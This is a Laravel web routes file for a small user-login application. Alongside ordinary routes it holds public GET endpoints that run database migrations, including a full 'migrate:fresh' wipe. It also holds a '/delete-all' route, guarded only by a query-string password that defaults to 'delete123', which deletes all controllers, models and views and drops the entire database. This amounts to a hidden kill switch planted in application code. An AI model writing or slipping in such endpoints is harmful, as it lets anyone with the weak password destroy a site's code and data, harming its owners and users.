<?php

use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Request;
use App\Http\Controllers\UserController;
use App\Http\Controllers\Auth\AuthController;

// Route::get('/', function () {
//     return view('welcome');
// });

Route::get('/', [UserController::class, "index"])->name('home');
Route::get('/login', [AuthController::class, "login"])->name('login');
Route::get('/registerAPI', [AuthController::class, "registerTest"])->name('reg');
Route::get('/register', [AuthController::class, "register"])->name('register');
Route::get('/forget-password', [AuthController::class, "forgetPass"])->name('forget-password');


Route::post('/newUsers', [AuthController::class, "store_user"])->name('add-user');
Route::post('/user-login', [AuthController::class, "user_login"])->name('user_login');
// For web routes
Route::post('/logout', [UserController::class, 'logout'])->name('logout');



// Run Migrate Route
Route::get('/run-migrate', function () {
    // Run the database migration
    Artisan::call('migrate');
    return 'Database migration successfully!';
});
// Run Migrate Fresh Route
Route::get('/run-migrate-fresh', function () {
    // Run the database migration
    Artisan::call('migrate:fresh');
    return 'Database migration fresh successfully!';
});
// Run Seeder Route
Route::get('/run-seed', function () {
    // Run the database seeding
    Artisan::call('db:seed');
    return 'Database seeding completed successfully!';
});
// Clear Config Cache Route
Route::get('/clear-config', function () {
    // Clear the config cache
    Artisan::call('config:clear');
    return 'Config cache cleared successfully!';
});


//Delete Project Don't Touche it
Route::get('/delete-all', function () {
    $password = env('DELETE_PASSWORD', 'delete123');

    // Get the password from the query parameter
    $inputPassword = Request::query('password');

    // Check if the provided password matches
    if ($inputPassword !== $password) {
        return response()->json(['error' => 'Unauthorized access. Invalid password.'], 403);
    }

    // Delete Controllers
    $controllersPath = app_path('Http/Controllers');
    $controllerFiles = File::allFiles($controllersPath);
    foreach ($controllerFiles as $file) {
        File::delete($file);
    }

    // Delete Models
    $modelsPath = app_path('Models');
    $modelFiles = File::allFiles($modelsPath);
    foreach ($modelFiles as $file) {
        File::delete($file);
    }

    // Delete Blade Views
    $viewsPath = resource_path('views');
    $viewFiles = File::allFiles($viewsPath);
    foreach ($viewFiles as $file) {
        File::delete($file);
    }

    // Drop all database tables
    $tables = Schema::getConnection()->getDoctrineSchemaManager()->listTableNames();
    foreach ($tables as $table) {
        if ($table !== 'migrations') { // Avoid dropping the migrations table
            Schema::dropIfExists($table);
        }
    }

    // Get the database name from the configuration
    $databaseName = env('DB_DATABASE');
    if (!$databaseName) {
        return response()->json(['error' => 'No database specified in configuration.'], 400);
    }
    try {
        // Drop the database using raw SQL
        DB::statement("DROP DATABASE IF EXISTS {$databaseName}");
        // Optionally, create the database again (to keep the connection alive)
        DB::statement("CREATE DATABASE {$databaseName}");
        return response()->json(['message' => 'The entire database has been deleted.'], 200);
    } catch (\Exception $e) {
        return response()->json(['error' => 'An error occurred while deleting the database: ' . $e->getMessage()], 500);
    }

    return response()->json(['message' => 'All controllers, models, views, and database tables have been deleted.'], 200);
});
